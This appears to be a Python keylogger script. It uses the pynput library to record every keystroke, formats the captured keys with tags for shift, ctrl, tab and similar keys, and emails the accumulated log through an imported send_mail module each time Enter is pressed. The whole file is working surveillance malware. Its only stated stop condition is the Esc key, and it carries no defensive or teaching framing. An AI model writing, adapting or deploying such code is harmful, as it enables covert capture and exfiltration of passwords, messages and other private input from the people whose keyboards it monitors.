from pynput.keyboard import Key, Listener
from send_mail import *

count = 0
keys = []


def on_press(key):
    global keys, count

    # Appending the keys as a string into
    # the empty list and increment count
    keys.append(str(key))
    print(f"{key} pressed")
    count += 1

    # if count is not 0 and
    # enter is pressed send report
    # and reset variables
    if count >= 1 and key == Key.enter:
        count = 0
        logs = format_logs(keys)
        send_mail.sendEmail(logs)
        keys = []
        print(logs)


def format_logs(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")

        # If spacebar is pressed then put a space
        if key == "Key.space":
            k = " "
        elif key == "Key.shift":
            k = "<shift>"
        elif key == "Key.ctrl_l":
            k = "<ctrl>"
        elif key == "Key.alt_l":
            k = "<alt>"
        elif key == "Key.tab":
            k = "<tab>"
        elif key == "Key.caps_lock":
            k = "<caps_lock>"
        elif key == "Key.enter":
            k = "<enter>"
        elif key.find("Key") > 0:
            k = ""
        message += k
    return message


def on_release(key):
    # The program quits when esc key is pressed
    if(key == Key.esc):
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
